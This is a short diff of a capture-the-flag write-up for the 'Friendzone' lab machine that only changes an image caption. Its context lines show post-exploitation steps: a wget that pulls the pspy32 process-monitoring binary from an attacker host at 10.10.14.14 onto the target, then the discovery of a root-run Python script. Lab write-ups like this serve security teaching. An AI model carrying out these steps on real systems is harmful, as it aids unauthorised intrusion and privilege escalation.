@@ -321,8 +321,7 @@ I create a folder on the target to work from: `mkdir /var/tmp/boo`
 From inside my new folder I download the binary with: `wget http://10.10.14.14/pspy32`
 And make it executable with: `chmod +x pspy32`
 
-![pspy32](/assets/img/friendzone/friendzone-pspy32.png)
-
+![pspy](/assets/img/friendzone/friendzone-pspy32.png)
 
 Running the program reveals that root is running a python script `/opt/server_admin/reporter.py`
 
